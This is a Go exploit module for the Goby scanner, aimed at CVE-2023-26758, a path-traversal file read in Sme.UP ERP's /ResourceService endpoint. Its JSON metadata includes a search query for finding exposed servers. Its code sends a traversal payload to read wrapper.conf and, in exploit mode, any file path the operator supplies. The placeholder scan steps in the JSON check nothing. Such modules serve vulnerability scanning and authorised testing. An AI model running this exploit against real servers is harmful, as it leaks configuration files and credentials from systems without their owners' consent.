package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Sme.UP ERP ResourceService File Read Vulnerability (CVE-2023-26758)",
    "Description": "<p>Sme.UP ERP is a suite of software developed by Sme.UP that organizations use to manage their daily business activities.</p><p>Sme.UP ERP version TOKYO V6R1M220406 has an arbitrary file reading vulnerability under the /ResourceService route.</p>",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.smeup.com/\">https://www.smeup.com/</a></p><p/><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Sme.UP ERP",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Sme.UP ERP ResourceService 文件读取漏洞（CVE-2023-26758）",
            "Product": "Sme.UP ERP",
            "Description": "<p>Sme.UP ERP 是 Sme.UP 开发的一套组织用于管理日常业务活动的软件。</p><p>Sme.UP ERP 版本 TOKYO V6R1M220406 在 /ResourceService 路由下存在任意文件读取漏洞。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.smeup.com/\">https://www.smeup.com/</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用该漏洞读取重要的系统文件（如数据库配置文件、系统配置文件）、数据库配置文件等，使得网站不安全。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Sme.UP ERP ResourceService File Read Vulnerability (CVE-2023-26758)",
            "Product": "Sme.UP ERP",
            "Description": "<p>Sme.UP ERP is a suite of software developed by Sme.UP that organizations use to manage their daily business activities.</p><p>Sme.UP ERP version TOKYO V6R1M220406 has an arbitrary file reading vulnerability under the /ResourceService route.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.smeup.com/\">https://www.smeup.com/</a></p><p><br></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"jetty-dir.css\"",
    "GobyQuery": "body=\"jetty-dir.css\"",
    "Author": "m0x0is3ry@foxmail.com",
    "Homepage": "https://www.smeup.com/",
    "DisclosureDate": "2023-02-27",
    "References": [
        "https://www.swascan.com/it/security-advisory-sme-up-erp/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2023-26758"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202302-2078"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../serviceNT/conf/wrapper.conf",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.5",
    "PostTime": "2023-09-19",
    "PocId": "10839"
}`

	sendPayloadab1497f05 := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/ResourceService")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = "customer=" + url.QueryEscape(filename)
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloadab1497f05(u, "../serviceNT/conf/wrapper.conf")
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "wrapper.java.")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := goutils.B2S(ss.Params["filePath"])
			rsp, err := sendPayloadab1497f05(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			expResult.Success = true
			expResult.Output = rsp.Utf8Html
			return expResult
		},
	))
}
